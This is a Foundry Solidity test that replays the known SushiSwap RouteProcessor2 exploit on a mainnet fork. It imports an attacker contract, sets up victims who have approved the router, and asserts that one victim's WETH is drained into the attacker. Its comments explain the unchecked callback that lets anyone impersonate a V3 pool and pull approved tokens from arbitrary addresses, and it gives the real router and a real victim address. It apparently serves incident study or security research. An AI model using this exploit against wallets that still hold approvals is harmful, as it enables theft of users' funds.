// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {SushiAttacker, IRouteProcessor2, IERC20} from "../../src/sushi-yoink/SushiAttacker.sol";
import {ForkUtils} from "../common/ForkUtils.t.sol";

contract SushiYoink is Test, ForkUtils {
    /**
     * @notice example attack: https://etherscan.io/tx/0xea3480f1f1d1f0b32283f8f282ce16403fe22ede35c0b71a732193e56c5c45e8
     * @notice router: https://etherscan.io/address/0x044b75f554b886A065b9567891e45c79542d7357
     * @notice SushiSwap router exploit comes from a bad callback. Although the line 328 comment in routerProcessor2 is correct,
     *         line 340 does not check the pool deployer. So you can impersonate a V3Pool, do a no-op swap, call safeTransferFrom
     *         on an arbitrary ERC20 and arbitrary from address on line 347 of routerProcessor2 contract.
     */
    //Importants addresses
    address constant ROUTER_ADDRESS = 0x044b75f554b886A065b9567891e45c79542d7357;
    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 constant BLOCK_NUMBER = 17007838; //one block before the attack happened

    SushiAttacker public attacker;
    IERC20 public weth;
    address public realVictim;
    address public victim1;
    address public victim2;

    function setUp() public {
        //setup fork
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        setupFork("sushi-yoink", rpcUrl, BLOCK_NUMBER);
        selectFork("sushi-yoink");

        console.log("Forked to block %s", BLOCK_NUMBER);
        console.log("chainId: %s", block.chainid);

        //deploy contracts
        attacker = new SushiAttacker(ROUTER_ADDRESS);
        weth = IERC20(WETH_ADDRESS);

        console.log("Attacker deployed at:", address(attacker));

        // Initialize victims
        realVictim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");

        // Setup victims with WETH and approvals
        _setupVictims(victim1, 100 ether);
        _setupVictims(victim2, 32 ether);
    }

    function testSingleVictimExploit() public {
        uint256 victim1BalanceBefore = weth.balanceOf(victim1);
        uint256 attackerBalanceBefore = weth.balanceOf(address(attacker));

        attacker.exploit(WETH_ADDRESS, victim1);

        uint256 victim1BalanceAfter = weth.balanceOf(victim1);
        assertEq(victim1BalanceAfter, 0);
        assertEq(weth.balanceOf(address(attacker)), attackerBalanceBefore + victim1BalanceBefore);
    }

    //Helper function to setup victims
    function _setupVictims(address victimAddress, uint256 Amount) internal {
        deal(address(weth), victimAddress, Amount);
        vm.prank(victimAddress);
        weth.approve(ROUTER_ADDRESS, type(uint256).max);

        console.log("\nVictim setup:", victimAddress);
        console.log("Balance:", weth.balanceOf(victimAddress) / 1e18, "WETH");
        console.log("Approved:", weth.allowance(victimAddress, ROUTER_ADDRESS));
    }
}
